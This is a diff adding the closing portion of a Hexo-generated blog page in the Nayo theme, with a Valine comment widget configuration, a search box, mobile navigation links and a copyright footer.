+    <div id="comment">
+    </div>
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+
+    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+
+    <script>
+        new Valine({
+            el: '#comment',
+            notify: false,
+            verify: false,
+            app_id: 'cFM0eCo0CQ9xmBXmHi1eltol-gzGzoHsz',
+            app_key: 'oh9tizsnvV2vNvWgqEvoNtQO',
+            path: window.location.pathname,
+            avatar: 'mm',
+            guest_info: ['nick', 'mail']
+        });
+    </script>
+    
+</div>	
+</article>
+
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" 
+        placeholder="Typing Something here." 
+        id="search-input" 
+        class="input" />
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			&copy;
+			
+			2019 -
+			
+			2023
+			Ikonw
+
+			<br/>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+  </body>        
+</html>
